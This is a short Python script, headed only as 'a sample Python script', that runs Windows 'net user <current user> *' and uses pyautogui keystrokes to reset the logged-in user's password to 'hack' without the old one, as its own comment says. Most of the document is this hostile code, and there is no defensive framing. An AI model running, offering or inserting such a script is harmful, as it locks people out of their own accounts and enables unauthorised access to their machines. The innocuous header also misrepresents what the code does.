# This is a sample Python script.
import getpass 
import subprocess #execute system command 
import pyautogui  #automate keyboard to type the password
username = getpass.getuser() #get username of current login user
subprocess.run("net user" +' "'+username+'"'+ " *",shell=True,input=pyautogui.typewrite(['h','a','c','k','enter','h','a','c','k','enter'])) 
#above line will automatically changes the password for current login user to hack without knowing the actual password
 
